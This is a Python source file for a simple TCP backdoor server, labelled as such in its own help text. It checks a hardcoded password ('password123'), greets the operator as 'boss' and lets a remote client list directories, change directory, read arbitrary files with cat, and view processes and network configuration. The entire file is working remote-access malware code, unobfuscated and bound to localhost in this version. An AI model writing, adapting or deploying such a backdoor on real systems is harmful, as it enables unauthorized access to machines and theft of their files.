import subprocess
import os

import socketserver
import socket, threading

# Handler for the TCP Server
class TCPRequestHandler(socketserver.BaseRequestHandler):
	BUFFER_SIZE = 4096
	def handle(self):
		# Handshake - check for correct password
		password = self.request.recv(self.BUFFER_SIZE)
		password = password.decode("utf-8")
		if password != "pass password123\n":
			self.request.sendall(bytearray("You have been disconnected\n", "utf-8"))
			self.server.shutdown()
			self.server.server_close()
		
		else:
			self.request.sendall(bytearray("Welcome boss.\n", "utf-8"))
			while True:
				# Receive input from the client
				data = self.request.recv(self.BUFFER_SIZE)
				if len(data) == self.BUFFER_SIZE:
					while True:
						try:
							data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
						except:
							break
				if len(data) == 0:
					break
				data = data.decode("utf-8")
				
				data = data.replace("\n", "")
		
				#Split the client input for multiple word commands
				commands = data.split(" ")
				if len(commands) > 2:
					secondWord = commands[1]
					i = 2
					while i < len(commands):
						secondWord = secondWord + " " + commands[i]
						i += 1
				elif len(commands) == 2:
					secondWord = commands[1]
		
				# Handle input from the client:
				if (commands[0] == "pwd" and len(commands) == 1):
					out = subprocess.check_output("pwd")
					out = out.decode("utf-8")
					self.request.sendall(bytearray(out, "utf-8"))
					
				elif (commands[0] == "cd" and len(commands) > 1):
					#Change the working directory to the one specified by 'cd'
					os.chdir(secondWord)
					out = subprocess.check_output("pwd")
					out = out.decode("utf-8")
					self.request.sendall(bytearray("New working direcory: " + out, "utf-8"))
					
				elif (commands[0] == "list" and len(commands) == 1):
					out = subprocess.check_output("ls")
					out = out.decode("utf-8")
					self.request.sendall(bytearray(out, "utf-8"))
					
				elif (commands[0] == "cat" and len(commands) > 1):
					out = subprocess.check_output(["cat", secondWord])
					out = out.decode("utf-8")
					self.request.sendall(bytearray(out, "utf-8"))
					
				elif (commands[0] == "net" and len(commands) == 1):
					out = subprocess.check_output("ifconfig")
					out = out.decode("utf-8")
					self.request.sendall(bytearray(out, "utf-8"))
					
				elif (commands[0] == "ps" and len(commands) == 1):
					out = subprocess.check_output("ps")
					out = out.decode("utf-8")
					self.request.sendall(bytearray(out, "utf-8"))
					
				elif (commands[0] == "help" and len(commands) == 1):
					self.request.sendall(bytearray("pwd			returns current working directory\n", "utf-8"))
					self.request.sendall(bytearray("cd <dir>		changes current working directory to <dir>\n", "utf-8"))
					self.request.sendall(bytearray("ls			lists the contents of the current working directory\n", "utf-8"))
					self.request.sendall(bytearray("cat <file>		return contents of <file>\n", "utf-8"))
					self.request.sendall(bytearray("off			terminates the backdoor program\n", "utf-8"))
					self.request.sendall(bytearray("ps 			prints a list of the current running processes\n", "utf-8"))
					self.request.sendall(bytearray("net			shows the current network configuration\n", "utf-8"))
					
				elif (commands[0] == "off" and len(commands) == 1):
					self.request.sendall(bytearray("Goodbye.\n", "utf-8"))
					self.server.shutdown()
					self.server.server_close()
					break
					
				else:
					self.request.sendall(bytearray("Command not found. Enter 'help' for list of commands.\n", "utf-8"))

if __name__ == "__main__":
	HOST, PORT = "localhost", 15292
	server = socketserver.ThreadingTCPServer((HOST,PORT), TCPRequestHandler)
	server.allow_reuse_address = True
	server.serve_forever()
